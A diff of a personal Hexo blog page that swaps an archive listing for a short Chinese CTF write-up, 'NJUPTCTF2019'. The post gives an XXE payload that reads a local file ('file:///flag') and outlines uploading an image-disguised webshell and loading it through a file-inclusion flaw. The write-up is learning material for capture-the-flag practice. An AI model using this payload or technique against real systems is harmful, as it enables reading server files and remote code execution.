@@ -6,18 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://ocgittt.github.io">
-  <title>Archives: 2019/7 | OC的博客</title>
+  <title>NJUPTCTF2019 | OC的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="what&apos;s your problem">
-<meta property="og:type" content="website">
-<meta property="og:title" content="OC的博客">
-<meta property="og:url" content="https://ocgittt.github.io/archives/2019/07/index.html">
+  <meta name="description" content="fake XML cookbook">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NJUPTCTF2019">
+<meta property="og:url" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/index.html">
 <meta property="og:site_name" content="OC的博客">
-<meta property="og:description" content="what&apos;s your problem">
+<meta property="og:description" content="fake XML cookbook">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/web1_s.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/web1.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/upload_s.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/upload.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/error.png">
+<meta property="og:updated_time" content="2019-11-29T02:03:40.137Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="OC的博客">
-<meta name="twitter:description" content="what&apos;s your problem">
+<meta name="twitter:title" content="NJUPTCTF2019">
+<meta name="twitter:description" content="fake XML cookbook">
+<meta name="twitter:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/web1_s.png">
   
     <link rel="alternative" href="/atom.xml" title="OC的博客" type="application/atom+xml">
   
@@ -143,36 +151,52 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-NJUPTCTF2019" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      NJUPTCTF2019
+    </h1>
+  
+
+        
+        <a href="/2019/09/25/NJUPTCTF2019/" class="archive-article-date">
+  	<time datetime="2019-09-25T09:07:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-25</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="fake-XML-cookbook"><a href="#fake-XML-cookbook" class="headerlink" title="fake XML cookbook"></a>fake XML cookbook</h2><a id="more"></a>
+<img src="/2019/09/25/NJUPTCTF2019/web1_s.png">
+
+<p>payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!xml</span> <span class="attr">version</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE doc[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/09/25/NJUPTCTF2019/web1.png">
+
+<h2 id="Upload-your-shell"><a href="#Upload-your-shell" class="headerlink" title="Upload your shell"></a>Upload your shell</h2><img src="/2019/09/25/NJUPTCTF2019/upload_s.png">
+
+<p>上传部分跟<a href="https://ddstick.github.io/2019/10/20/BUUCTF-web-Checkln/" target="_blank" rel="noopener">这道题</a>有点像</p>
+<img src="/2019/09/25/NJUPTCTF2019/upload.png">
+
+<p>重点是不知道上传之后文件的路径以及如何文件包含利用图片马</p>
+<p>但是后来看到<a href="https://www.virtua1.cn/archives/733/" target="_blank" rel="noopener">Virtua1的WP</a></p>
+<p>他上传之后有显示filepath,然后利用首页的文件包含包含shell就可以了</p>
+<p>问题可能出在没写全GIF89a?
+前两天还能访问题目网址今天没课想做一下就不行了</p>
+<img src="/2019/09/25/NJUPTCTF2019/error.png">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/31/ichunqiuSQL/" class="archive-article-date">
-  	<time datetime="2019-07-31T15:53:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-31</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/31/ichunqiuSQL/">ichunqiuSQL</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -184,247 +208,128 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/31/bugku/" class="archive-article-date">
-  	<time datetime="2019-07-30T16:14:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-31</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2019/09/25/JarvisOJ/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          jarvisOJ
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/09/18/爬虫学习/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">爬虫学习</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/31/bugku/">bugku</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fake-XML-cookbook"><span class="toc-number">1.</span> <span class="toc-text">fake XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-your-shell"><span class="toc-number">2.</span> <span class="toc-text">Upload your shell</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/28/no-privileges-on-mysql/" class="archive-article-date">
-  	<time datetime="2019-07-28T12:40:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-28</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/28/no-privileges-on-mysql/">no privileges on mysql</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">keng</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/27/blogs-from-wordpress-to-hexo/" class="archive-article-date">
-  	<time datetime="2019-07-27T03:58:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/27/blogs-from-wordpress-to-hexo/">blogs from wordpress to hexo</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">keng</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/27/本地图片显示不出来的坑/" class="archive-article-date">
-  	<time datetime="2019-07-26T16:28:33.753Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/27/本地图片显示不出来的坑/">本地图片显示不出来的解决方案</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/keng//" class="article-tag-list-link color5">keng</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+    </div>
+</aside>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/25/sqli-labs-master/" class="archive-article-date">
-  	<time datetime="2019-07-25T12:44:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-25</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/25/sqli-labs-master/">sqli-labs-master</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/16/buuctf/" class="archive-article-date">
-  	<time datetime="2019-07-16T06:13:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/16/buuctf/">BUUCTF记事本</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -447,8 +352,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
